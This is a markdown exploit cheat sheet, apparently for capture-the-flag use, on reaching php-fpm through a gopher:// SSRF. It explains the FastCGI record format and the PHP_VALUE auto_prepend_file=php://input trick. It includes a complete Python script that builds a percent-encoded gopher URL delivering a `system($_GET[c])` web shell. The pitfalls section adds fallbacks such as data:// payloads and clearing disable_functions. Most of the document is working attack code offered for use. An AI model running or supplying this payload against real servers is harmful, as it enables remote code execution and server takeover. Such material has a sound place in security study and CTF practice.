# FastCGI via gopher — the php-fpm binary payload

php-fpm listens on :9000 speaking FastCGI — a binary record-
protocol. gopher carries binary via %-encoding — the whole FCGI
session fits in one URL — the auto_prepend trick runs your PHP.

---

## 1. The FastCGI record-layout

```text
every record = 8-byte header + content + padding:
  version(1) = 0x01
  type(1)    = the record-type
  reqid(2)   = request-id — big-endian
  conlen(2)  = content-length — big-endian
  padlen(1)  = padding-length
  resvd(1)   = 0x00

record-types:
  0x01 FCGI_BEGIN_REQUEST  — content = role(2) + flags(1) + 5x00
  0x02 FCGI_ABORT_REQUEST
  0x03 FCGI_END_REQUEST
  0x04 FCGI_PARAMS         — content = name-value pairs
  0x05 FCGI_STDIN          — content = the request-body
  0x06 FCGI_STDOUT         — the response
  0x07 FCGI_STDERR
  0x08 FCGI_DATA
```

## 2. The session — the record-sequence

```text
BEGIN_REQUEST   — role=1 (responder) — keeps the conn
PARAMS          — the script-context — SCRIPT_FILENAME + the
                  request-meta — then an EMPTY PARAMS to end
STDIN           — the body — then an EMPTY STDIN to end
→ the worker runs the script → STDOUT+STDERR records return
```

## 3. The PARAMS encoding — name-value pairs

```text
each pair = namelen(1-or-4) + vallen(1-or-4) + name + value
  - if high-bit of the len-byte set → the len is 4 bytes:
    len < 128  → 1 byte
    len ≥ 128  → 4 bytes (high-bit set, value in low-31)
params the exploit needs:
  SCRIPT_FILENAME  = the php-file to run — /var/www/html/x.php —
                     must EXIST — any php-file on disk works
  REQUEST_METHOD   = POST
  CONTENT_TYPE     = application/x-www-form-urlencoded
  CONTENT_LENGTH   = body-length
  PHP_VALUE        = the magic param — php-ini-override!
                     "auto_prepend_file=php://input" +
                     "allow_url_include=1"
  PHP_ADMIN_VALUE  = the admin-ini
  DOCUMENT_ROOT    = /var/www/html
  SCRIPT_NAME      = /x.php
  REQUEST_URI      = /x.php
  GATEWAY_INTERFACE= FastCGI/1.0
  SERVER_SOFTWARE  = x
  REMOTE_ADDR      = 127.0.0.1
  REMOTE_PORT      = 9999
  SERVER_ADDR      = 127.0.0.1
  SERVER_PORT      = 80
  SERVER_NAME      = x
  SERVER_PROTOCOL  = HTTP/1.1
  QUERY_STRING     = (empty)
```

## 4. The auto_prepend chain — RCE

```text
the trick: PHP_VALUE auto_prepend_file=php://input
  → php runs php://input BEFORE the real script
  → php://input = the STDIN-body → YOUR php-code
  → body = <?php system($_GET['c']);?> — actually the body is
    the code itself — php://input = the raw-body → the php-eval
    runs it → RCE — combined with allow_url_include=1 for
    stream-schemes

the full set:
  PHP_VALUE: auto_prepend_file=php://input
  PHP_VALUE: allow_url_include=On
  PHP_VALUE: auto_append_file=php://input (fallback)
  or: PHP_VALUE: disable_functions= (empty — re-enable)
  or: PHP_VALUE: open_basedir=/
```

## 5. The byte-construction — scripted

```python
def rec(t, rid, content):
    pad = (-len(content)) % 8
    return (b"\x01" + bytes([t]) + rid.to_bytes(2,"big") +
            len(content).to_bytes(2,"big") + bytes([pad,0]) +
            content + b"\x00"*pad)

def nvpair(name, value):
    n, v = name.encode(), value.encode()
    nb = bytes([len(n)]) if len(n) < 128 else \
         (len(n)|0x80000000).to_bytes(4,"big")
    vb = bytes([len(v)]) if len(v) < 128 else \
         (len(v)|0x80000000).to_bytes(4,"big")
    return nb + vb + n + v

session = b""
session += rec(1, 1, b"\x00\x01\x00\x00\x00\x00\x00\x00")   # BEGIN
params = b""
for k,v in [("SCRIPT_FILENAME","/var/www/html/index.php"),
            ("REQUEST_METHOD","POST"),
            ("PHP_VALUE","auto_prepend_file=php://input\nallow_url_include=On"),
            ("CONTENT_LENGTH","25"),
            ("CONTENT_TYPE","application/x-www-form-urlencoded")]:
    params += nvpair(k,v)
session += rec(4, 1, params)                                # PARAMS
session += rec(4, 1, b"")                                   # PARAMS-end
session += rec(5, 1, b"<?php system($_GET[c]);?>")          # STDIN
session += rec(5, 1, b"")                                   # STDIN-end
url = "gopher://127.0.0.1:9000/_" + "".join(f"%{b:02x}" for b in session)
# → the gopher-url — ~600+ bytes of %-encoded FCGI
```

## 6. The response — what comes back

```text
the worker's FCGI_STDOUT records → the php-output → the
  fetcher returns the raw bytes — the FCGI-headers are binary —
  the php-output is inside — grep the flag in the noise —
  strip-records mentally — the payload-output sits between the
  binary record-headers
```

## 7. The pitfalls

```text
- SCRIPT_FILENAME must be a real php-file — a 404-file → fpm
  "File not found" — use /var/www/html/index.php or any php on
  disk — the auto_prepend runs regardless of the real-file's
  content — only the file's EXISTENCE matters
- the namelen/vallen encoding — len ≥ 128 needs the 4-byte form —
  a len-field off-by-one desyncs the whole stream
- the padding — each record pads to 8-alignment — wrong padlen →
  the next record misaligns
- reqid — usually 1 — the records share it
- CRLF-in-PHP_VALUE — the \n separates ini-entries — %0a inside
  the value — each ini-set is its own line
- php-fpm version — the auto_prepend_file=php://input trick needs
  allow_url_include — On by default? — off on hardenend — the
  fallback is PHP_VALUE auto_prepend_file=<a-file-you-can-write>
  — needs a write-primitive staged — or the body-as-code via
  data:// — "auto_prepend_file=data://text/plain;base64,<?php…>"
```

## 8. The unix-socket variant

```text
php-fpm often listens on a UNIX-socket not :9000 —
  /var/run/php/php7.x-fpm.sock — http+unix:// or the unix-aware
  fetcher — or gopher can't reach unix — the unix-socket shape
  needs a different transport — see unix-socket.md — most CTF-
  drops put fpm on :9000 tcp for exactly this reason
```
